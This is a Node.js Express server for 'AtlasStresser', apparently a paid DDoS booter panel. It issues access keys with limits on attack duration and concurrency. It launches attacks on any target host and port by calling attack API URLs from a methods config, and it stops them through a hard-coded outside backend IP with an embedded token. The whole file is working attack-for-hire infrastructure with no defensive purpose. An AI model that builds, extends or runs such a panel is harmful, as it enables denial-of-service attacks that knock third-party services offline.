require('dotenv').config();
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const mongoose = require('mongoose');
const { MongoStore } = require('connect-mongo');

const app = express();
const PORT = process.env.PORT || 3000;

// Load general config
const APP_CONFIG = path.join(__dirname, 'config', 'config.json');
let appConfig = {
  mongodb: {
    uri: 'mongodb://node62.lunes.host:3039/atlasstresser',
    options: {
      bufferCommands: true,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 10000
    }
  },
  session: {
    secret_prefix: 'atlasstresser_secret_'
  }
};

try {
  if (fs.existsSync(APP_CONFIG)) {
    const loadedConfig = JSON.parse(fs.readFileSync(APP_CONFIG, 'utf8'));
    appConfig = { ...appConfig, ...loadedConfig };
  }
} catch (e) {
  console.error('Error loading config.json:', e.message);
}

// Determine environment
const isVercel = process.env.VERCEL === '1';

// Serverless-friendly MongoDB connection
let cached = global.mongoose;
if (!cached) {
  cached = global.mongoose = { conn: null, promise: null };
}

async function connectToDatabase() {
  if (cached.conn) {
    return cached.conn;
  }
  if (!cached.promise) {
    const opts = appConfig.mongodb.options;
    cached.promise = mongoose.connect(appConfig.mongodb.uri, opts).then((mongoose) => {
      console.log('Connected to MongoDB');
      return mongoose;
    }).catch(err => {
      console.error('MongoDB connection error:', err);
      cached.promise = null;
      throw err;
    });
  }
  cached.conn = await cached.promise;
  return cached.conn;
}

// Ensure DB is connected before any request
app.use(async (req, res, next) => {
  try {
    await connectToDatabase();
    next();
  } catch (error) {
    res.status(500).json({ success: false, message: 'Database connection failed' });
  }
});

// Mongoose Models
const keySchema = new mongoose.Schema({
  key: { type: String, required: true, unique: true },
  permission: [String],
  limits: {
    max_time: { type: Number, default: 0 },
    concurrent: { type: Number, default: 0 },
    cooldown: { type: Number, default: 0 }
  },
  created_at: { type: Date, default: Date.now },
  last_used: { type: Date, default: null },
  status: { type: String, default: 'locked' }
});

const attackSchema = new mongoose.Schema({
  attack_id: { type: String, required: true, unique: true },
  key: { type: String, required: true },
  target: { type: String, required: true },
  port: { type: String, required: true },
  time: { type: Number, required: true },
  method: { type: String, required: true },
  status: { type: String, default: 'running' },
  start_time: { type: Date, default: Date.now },
  end_time: { type: Date }
});

const Key = mongoose.model('Key', keySchema);
const Attack = mongoose.model('Attack', attackSchema);

// Load methods config
const METHODS_CONFIG = path.join(__dirname, 'config', 'methods.json');
let methodsConfig = [];
try {
  methodsConfig = JSON.parse(fs.readFileSync(METHODS_CONFIG, 'utf8'));
} catch (e) {
  console.error('Error loading methods.json:', e.message);
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use('/config', express.static(path.join(__dirname, 'config')));
app.use(session({
  secret: (appConfig.session.secret_prefix || 'atlasstresser_secret_') + crypto.randomBytes(16).toString('hex'),
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: appConfig.mongodb.uri,
    collectionName: 'sessions'
  }),
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

// Routes

// GET / - Redirect to login
app.get('/', (req, res) => {
  res.redirect('/login');
});

// GET /sidebar-example - Sidebar demo page
app.get('/sidebar-example', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'sidebar-example.html'));
});

// GET /timer-config - Timer configuration demo
app.get('/timer-config', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'timer-config-modern.html'));
});

// GET /token-modal - Token modal demo
app.get('/token-modal', (req, res) => {
  res.sendFile(path.join(__dirname, 'views', 'token-modal.html'));
});

// GET /login - Login page
app.get('/login', (req, res) => {
  if (req.session.userKey) {
    return res.redirect('/hub/panel');
  }
  res.sendFile(path.join(__dirname, 'views', 'login.html'));
});

// POST /api/login - Validate key
app.post('/api/login', async (req, res) => {
  const { token } = req.body;

  console.log('Login attempt:', { token: token ? 'present' : 'missing' });

  if (!token) {
    return res.status(400).json({ success: false, message: 'Token is required.' });
  }

  try {
    const user = await Key.findOne({ key: token });

    if (!user) {
      return res.status(404).json({ success: false, message: 'Invalid token.' });
    }

    req.session.userKey = token;
    req.session.permission = user.permission || [];
    req.session.limits = user.limits;
    req.session.status = user.status;

    console.log('Login successful for token:', token.substring(0, 8) + '...');
    res.json({ success: true, redirect: '/hub/dashboard' });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// POST /api/generate-key - Create new key
app.post('/api/generate-key', async (req, res) => {
  const key = crypto.randomUUID();

  try {
    const newKey = new Key({
      key,
      permission: [],
      limits: {
        max_time: 0,
        concurrent: 0,
        cooldown: 0
      },
      status: 'locked'
    });

    await newKey.save();

    res.json({
      success: true,
      key,
      message: 'Key generated! Copy now - it is LOCKED (0s, 0 slot, 0 cooldown). Contact admin to activate.'
    });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// GET /hub/dashboard
app.get('/hub/dashboard', async (req, res) => {
  if (!req.session.userKey) {
    return res.redirect('/login');
  }

  try {
    const user = await Key.findOne({ key: req.session.userKey });

    if (!user) {
      req.session.destroy();
      return res.redirect('/login');
    }

    req.session.permission = user.permission || [];
    req.session.limits = user.limits;
    req.session.status = user.status;

    res.sendFile(path.join(__dirname, 'views', 'dashboard.html'));
  } catch (err) {
    res.status(500).send('Database error');
  }
});

// GET /hub/panel
app.get('/hub/panel', async (req, res) => {
  if (!req.session.userKey) {
    return res.redirect('/login');
  }

  try {
    const user = await Key.findOne({ key: req.session.userKey });

    if (!user) {
      req.session.destroy();
      return res.redirect('/login');
    }

    req.session.permission = user.permission || [];
    req.session.limits = user.limits;
    req.session.status = user.status;

    res.sendFile(path.join(__dirname, 'views', 'panel.html'));
  } catch (err) {
    res.status(500).send('Database error');
  }
});

// GET /hub/methods
app.get('/hub/methods', async (req, res) => {
  if (!req.session.userKey) {
    return res.redirect('/login');
  }

  try {
    const user = await Key.findOne({ key: req.session.userKey });

    if (!user) {
      req.session.destroy();
      return res.redirect('/login');
    }

    req.session.permission = user.permission || [];
    req.session.limits = user.limits;
    req.session.status = user.status;

    res.sendFile(path.join(__dirname, 'views', 'panel.html'));
  } catch (err) {
    res.status(500).send('Database error');
  }
});

// GET /hub/api
app.get('/hub/api', async (req, res) => {
  if (!req.session.userKey) {
    return res.redirect('/login');
  }

  try {
    const user = await Key.findOne({ key: req.session.userKey });

    if (!user) {
      req.session.destroy();
      return res.redirect('/login');
    }

    res.sendFile(path.join(__dirname, 'views', 'panel.html'));
  } catch (err) {
    res.status(500).send('Database error');
  }
});

// Helper for cleaning up attacks
async function cleanupExpiredAttacks() {
  try {
    const attacks = await Attack.find({ status: 'running' });
    const now = new Date();
    const idsToDelete = [];

    for (const a of attacks) {
      const startTime = new Date(a.start_time);
      const endTime = new Date(startTime.getTime() + a.time * 1000);
      if (now >= endTime) {
        idsToDelete.push(a._id);
      }
    }

    if (idsToDelete.length > 0) {
      await Attack.deleteMany({ _id: { $in: idsToDelete } });
    }

    // Also cleanup any stopped attacks just in case
    await Attack.deleteMany({ status: 'stopped' });
  } catch (e) {
    console.error('Error cleaning up attacks:', e);
  }
}

// POST /api/start-attack
app.post('/api/start-attack', async (req, res) => {
  if (!req.session.userKey) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  const { target, port, time, method } = req.body;

  try {
    const user = await Key.findOne({ key: req.session.userKey });

    if (!user) {
      return res.status(404).json({ success: false, message: 'Key not found' });
    }

    if (user.status === 'locked' || user.limits.max_time === 0) {
      return res.status(403).json({
        success: false,
        message: 'Key not activated by admin. Contact administrator.'
      });
    }

    if (time > user.limits.max_time) {
      return res.status(400).json({
        success: false,
        message: `Duration exceeds limit. Max: ${user.limits.max_time}s`
      });
    }

    const methodConfig = methodsConfig.find(m => m.name === method);
    if (!methodConfig) {
      return res.status(400).json({ success: false, message: 'Invalid method' });
    }

    if (methodConfig.permission.length > 0) {
      const hasPermission = methodConfig.permission.some(p => user.permission.includes(p));
      if (!hasPermission) {
        return res.status(403).json({ success: false, message: 'No permission for this method' });
      }
    }

    // Clean up first to get accurate count
    await cleanupExpiredAttacks();
    const activeAttacksCount = await Attack.countDocuments({ key: req.session.userKey, status: 'running' });

    if (activeAttacksCount >= user.limits.concurrent) {
      return res.status(400).json({
        success: false,
        message: `Concurrent limit reached. Max: ${user.limits.concurrent}`
      });
    }

    let attackUrl = methodConfig.api[0];
    attackUrl = attackUrl
      .replace('<<$host>>', target)
      .replace('<<$time>>', time)
      .replace('<<$port>>', port);

    if (attackUrl.includes('<<$slot>>')) {
      attackUrl = attackUrl.replace('<<$slot>>', user.limits.concurrent || 1);
    }

    const response = await fetch(attackUrl);
    const data = await response.json();

    if (response.ok) {
      const attackId = crypto.randomBytes(4).toString('hex');
      const newAttack = new Attack({
        attack_id: attackId,
        key: req.session.userKey,
        target,
        port,
        time,
        method,
        status: 'running'
      });
      await newAttack.save();

      res.json({
        success: true,
        attack_id: attackId,
        message: 'Attack started',
        api_response: data
      });
    } else {
      res.status(response.status).json({
        success: false,
        message: 'API error',
        api_response: data
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Failed to start attack: ' + error.message
    });
  }
});

// POST /api/stop-attack
app.post('/api/stop-attack', async (req, res) => {
  if (!req.session.userKey) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  const { attack_id } = req.body;

  try {
    const attack = await Attack.findOne({ attack_id, key: req.session.userKey });

    if (!attack) {
      return res.status(404).json({ success: false, message: 'Attack not found' });
    }

    const statusUrl = `http://139.162.17.179:522/status?token=malasahjago`;
    const statusRes = await fetch(statusUrl);
    const statusData = await statusRes.json();
    
    let apiAttackId = null;
    if (statusData.status === 'success' && statusData.data && statusData.data.attacks && statusData.data.attacks.running) {
      const runningAttacks = statusData.data.attacks.running;
      
      // Normalize target for comparison (stripping trailing slashes)
      const normalizeUrl = (url) => url.replace(/\/+$/, '').toLowerCase();
      const targetSearch = normalizeUrl(attack.target);

      const found = runningAttacks.find(a => normalizeUrl(a.target) === targetSearch);
      if (found) {
        apiAttackId = found.id;
        console.log(`[STOP] Found API ID: ${apiAttackId} for target: ${attack.target}`);
      } else {
        console.log(`[STOP] Could not find ${attack.target} in active attacks list:`, runningAttacks.map(a => a.target));
      }
    }

    let stopUrl;
    if (apiAttackId) {
      stopUrl = `http://139.162.17.179:522/stop?token=malasahjago&id=${apiAttackId}`;
    } else {
      // Fallback to target/port if not found in active status list
      stopUrl = `http://139.162.17.179:522/stop?token=malasahjago&target=${attack.target}&port=${attack.port}`;
    }

    const response = await fetch(stopUrl);
    const data = await response.json();

    // Delete attack from history
    await Attack.deleteOne({ attack_id });

    res.json({ success: true, message: 'Attack stopped', api_response: data });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Failed to stop attack: ' + error.message });
  }
});

// GET /api/status - Get attack status
app.get('/api/status', async (req, res) => {
  if (!req.session.userKey) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  try {
    await cleanupExpiredAttacks();
    const userAttacks = await Attack.find({ key: req.session.userKey, status: 'running' });
    res.json({ success: true, attacks: userAttacks });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// GET /api/attacks - Get all attacks history
app.get('/api/attacks', async (req, res) => {
  if (!req.session.userKey) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  try {
    await cleanupExpiredAttacks();
    const userAttacks = await Attack.find({ key: req.session.userKey }).sort({ start_time: -1 });
    res.json({ success: true, attacks: userAttacks });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// GET /api/user-info
app.get('/api/user-info', async (req, res) => {
  if (!req.session.userKey) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  try {
    const user = await Key.findOne({ key: req.session.userKey });

    if (!user) {
      return res.status(404).json({ success: false, message: 'Key not found' });
    }

    res.json({
      success: true,
      key: user.key,
      permission: user.permission,
      limits: user.limits,
      status: user.status
    });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
});

// POST /api/logout
app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true, redirect: '/login' });
});

// Start server (only if not running in Vercel)
if (!isVercel) {
  app.listen(PORT, () => {
    console.log(`AtlasStresser running on http://localhost:${PORT}`);
    console.log(`User Panel: http://localhost:${PORT}/hub/panel`);
  });
}

module.exports = app;
